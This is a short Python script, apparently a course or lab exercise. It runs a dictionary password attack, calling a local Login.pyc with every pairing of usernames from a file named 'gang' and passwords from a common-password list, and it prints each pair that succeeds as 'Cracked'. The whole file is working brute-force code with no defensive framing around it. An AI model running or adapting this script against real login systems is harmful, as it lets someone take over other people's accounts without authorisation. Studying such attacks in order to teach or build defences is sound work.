import subprocess
import time

start = time.time()
print("Start time:", start)

with open("gang") as users, open("MostCommonPWs") as pws:
    passwords = [p.strip() for p in pws]
    for user in users:
        user = user.strip()
        for pw in passwords:
            r = subprocess.run(
                ["python3", "Login.pyc", user, pw],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            if r.returncode == 0:
                print("Cracked:", user, pw)
                break

end = time.time()
print("End time:", end)
print("Runtime:", end - start)
